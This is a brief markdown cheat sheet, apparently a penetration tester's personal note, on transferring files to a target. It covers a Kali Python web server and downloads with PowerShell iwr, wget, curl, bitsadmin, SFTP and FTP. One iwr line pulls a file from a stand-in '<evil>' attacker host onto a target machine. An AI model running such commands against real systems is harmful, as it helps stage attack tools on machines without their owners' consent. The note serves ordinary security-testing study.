---
title: Ways to transfer files
updated: 2025-05-15 04:22:05Z
created: 2025-05-01 07:27:19Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

### Download via Kali web server
1. Start web server
`python3 -m http.server 80`

2. On the client, download using:

### Overview of iwr (Invoke-WebRequest):
**Invoke-WebRequest** is a cmdlet in PowerShell used to send HTTP requests to a web server, fetch content, and interact with REST APIs or download files.

`iwr -uri http://<evil>/<source> -Outfile <target>`
  
### wget
`wget -O <output_file> https://example.com/file.zip`

### curl
`curl -o <output_file> https://example.com/file.zip`

### bitsadmin
`bitsadmin /transfer mydownloadjob /download /priority high https://example.com/file.zip <output_file>`

### SFTP/FTP
`sftp <user>@<target>`
`get /<remote>/file.zip /<local>/file.zip`

`ftp ftp.example.com`
login with username/password
`get /<remote>/file.zip`